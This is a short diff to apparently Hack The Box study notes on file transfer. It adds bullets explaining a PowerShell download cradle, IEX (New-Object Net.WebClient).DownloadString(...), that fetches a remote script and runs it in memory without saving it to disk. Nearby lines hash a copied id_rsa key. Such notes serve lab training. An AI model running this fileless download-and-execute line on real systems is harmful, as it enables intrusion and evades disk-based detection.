@@ -53,4 +53,8 @@ PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
 IEX (New-Object Net.WebClient).DownloadString('https://example.com/script.ps1')
 ```
 
-- `DownloadString()` downloads the sc
+- `DownloadString()` downloads the scripts contents as text
+- `IEX` executes that text as PowerShell code
+- No script file saved to disk
+
+#### Invoke-WebRequests
